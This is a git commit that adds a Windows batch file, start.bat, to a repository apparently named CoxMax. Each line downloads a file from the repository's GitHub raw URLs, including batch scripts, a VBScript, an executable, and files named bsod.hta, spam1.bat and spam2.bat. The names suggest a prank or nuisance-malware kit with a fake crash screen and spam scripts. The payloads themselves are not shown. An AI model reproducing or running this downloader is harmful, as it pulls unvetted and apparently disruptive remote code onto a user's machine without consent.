c534248d781f6b5d4a014f8253a79c5b6f64dc57
Cox-school <85566656+Cox-school@users.noreply.github.com>
2021-06-08 15:33:04 +0100

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,14 @@
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/CoxMax.bat" CoxMax.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/QRes.exe" QRes.exe
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/Start2.bat" Start2.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/Start3.bat" Start3.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/bsod.hta" bsod.hta
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/image1.gif" image1.gif
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/image2.jpg" image2.jpg
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/l.vbs" l.vbs
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/removal.bat" removal.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/screen.bat" screen.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/song.mp3" song.mp3
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/spam1.bat" spam1.bat
+call download.bat "https://raw.githubusercontent.com/Cox-school/CoxMax/main/spam2.bat" spam2.bat
+pause
